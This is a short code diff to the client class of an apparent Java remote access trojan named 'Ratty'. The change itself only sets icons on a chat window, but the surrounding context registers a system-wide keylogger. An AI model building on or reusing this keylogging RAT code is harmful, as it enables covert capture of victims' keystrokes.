@@ -4,7 +4,10 @@
 
 package de.sogomn.rat;
 
+import java.awt.image.BufferedImage;
 import java.io.File;
+import java.util.Arrays;
+import java.util.List;
 import java.util.logging.Level;
 import java.util.logging.Logger;
 
@@ -15,6 +18,7 @@ import org.jnativehook.keyboard.NativeKeyEvent;
 import org.jnativehook.keyboard.NativeKeyListener;
 
 import de.sogomn.engine.util.FileUtils;
+import de.sogomn.engine.util.ImageUtils;
 import de.sogomn.rat.gui.IGuiController;
 import de.sogomn.rat.gui.swing.ChatSwingGui;
 import de.sogomn.rat.packet.ChatPacket;
@@ -58,7 +62,10 @@ public final class RattyClient implements IConnectionObserver, IGuiController {
 			}
 		};
 		
+		final List<BufferedImage> iconList = Arrays.asList(ImageUtils.EMPTY_IMAGE);
+		
 		connection.setObserver(this);
+		chat.setIcons(iconList);
 		chat.addListener(this);
 		GlobalScreen.addNativeKeyListener(keylogger);
 	}
